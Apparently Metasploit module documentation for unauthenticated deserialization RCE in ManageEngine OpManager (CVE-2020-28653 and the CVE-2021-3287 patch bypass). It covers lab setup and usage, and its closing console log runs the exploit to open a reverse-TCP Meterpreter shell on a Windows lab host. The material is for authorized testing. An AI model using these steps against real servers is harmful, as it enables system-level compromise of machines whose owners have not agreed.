## Vulnerable Application

### Description

An HTTP endpoint used by the Manage Engine OpManager Smart Update Manager component can be leveraged to deserialize an
arbitrary Java object. This can be abused by an unauthenticated remote attacker to execute OS commands in the context of
the OpManager application (NT AUTHORITY\SYSTEM on Windows or root on Linux). This vulnerability is also present in other
products that are built on top of the OpManager application. This vulnerability affects OpManager versions 12.1 -
12.5.328.

#### CVE-2020-28653
This vulnerability affects OpManager versions 12.1 - 12.5.232. The vulnerability involves sending a malicious PDU to the
SmartUpdateManager handler that when deserialized executes an arbitrary OS command.

#### CVE-2021-3287
This vulnerability is a patch bypass for CVE-2020-28653 and affects OpManager versions 12.5.233 - 12.5.328. When the
original vulnerability was patched, it was done so using a new `ITOMObjectInputStream` deserializer class. This object
has a flaw in its validation logic. The object works by requiring the caller to specify a list of one or more object
classes that can be deserialized. If an instance is used to perform more than one `readObject` call however, only the
first is protected because once a serialized object of an allowed type is read from the stream, the
`ITOMObjectInputStream` instance remains in a sort of authenticated state where subsequent objects can be read of any
type.

The exploit technique for this CVE leverages this by first sending a legitimate, serialized SUMPDU to create an instance
of the `SUMServerIOAndDataAnalyzer` object whose `process` method makes multiple `readObject` calls using the same
instance for each.

Unlike exploiting CVE-2020-28653, to exploit CVE-2021-3287 the target server must have the SUM server running. This is
not the case for the standard installer, but is the case for "Central" variant. Without the SUM server running, the log
handler is not initialized which causes the request handler to crash making the vulnerable code path inaccessible.

### Setup (Windows)

1. Download an affected version for either Windows or Linux from the [archive][0]
1. Run the installer executable
1. Accept the default values for all settings (skip registration), until the very end when prompted to start the
  application
1. Unselect the option to start the application
    1. If this option is missed, just navigate to the tray icon where it will say that it's starting and select the
      option to stop it
1. Start a command prompt as an administrative user
1. Navigate to `C:\Program Files\ManageEngine\OpManager\bin`, older versions use `C:\ManageEngine\OpManager\bin`
1. Run `run.bat`
1. View and accept the license terms
1. Press `f` to run the product in Free mode

OpManager should start successfully after a few minutes. At that point the service can be exploited. In this case the
session will be opened in the context of the user that ran the service with `run.bat`. Once the server is restarted and
OpManager starts automatically, the vulnerability can be exploited to open a session in the context of NT
AUTHORITY\SYSTEM.

### Setup (Linux)

1. Download an affected version for either Windows or Linux from the [archive][0]
1. Run the installer executable as root
1. Accept the default values for all settings (skip registration)
1. Navigate to `/opt/ManageEngine/OpManagerCentral/bin`, older versions use `/opt/ManageEngine/OpManager/bin`
1. Run `run.sh` as root

## Verification Steps

1. Install the application
1. Start msfconsole
1. Do: `use exploit/multi/http/opmanager_sumpdu_deserialization`
1. Set the `RHOSTS`, `TARGET`, `PAYLOAD` and payload-related options as necessary
1. Do: `run`
1. You should get a shell.

## Options

### CVE
Vulnerability to use. If set to 'Automatic' (the default), the module will attempt to detect the version and select the
correct vulnerability.

## Scenarios

### Windows Server 2019 x64 w/ ManageEngine OpManager v12.5.328

```
msf6 > use exploit/multi/http/opmanager_sumpdu_deserialization 
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/http/opmanager_sumpdu_deserialization) > set RHOSTS 192.168.159.96
RHOSTS => 192.168.159.96
msf6 exploit(multi/http/opmanager_sumpdu_deserialization) > set TARGET Windows\ PowerShell 
TARGET => Windows PowerShell
msf6 exploit(multi/http/opmanager_sumpdu_deserialization) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/http/opmanager_sumpdu_deserialization) > set LHOST 192.168.159.128
LHOST => 192.168.159.128
msf6 exploit(multi/http/opmanager_sumpdu_deserialization) > check
[*] 192.168.159.96:8060 - The target appears to be vulnerable.
msf6 exploit(multi/http/opmanager_sumpdu_deserialization) > exploit

[*] Started reverse TCP handler on 192.168.159.128:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] An HTTP session cookie has been issued
[*] Detected version: 12.5.328
[*] The request handler has been associated with the HTTP session
[*] Sending stage (200262 bytes) to 192.168.159.96
[*] Meterpreter session 2 opened (192.168.159.128:4444 -> 192.168.159.96:63887) at 2021-09-16 14:06:27 -0400

meterpreter > getuid
Server username: MSFLAB\smcintyre
meterpreter > sysinfo
Computer        : WIN-3MSP8K2LCGC
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : MSFLAB
Logged On Users : 9
Meterpreter     : x64/windows
meterpreter > 
```

[0]: https://archives.manageengine.com/opmanager/
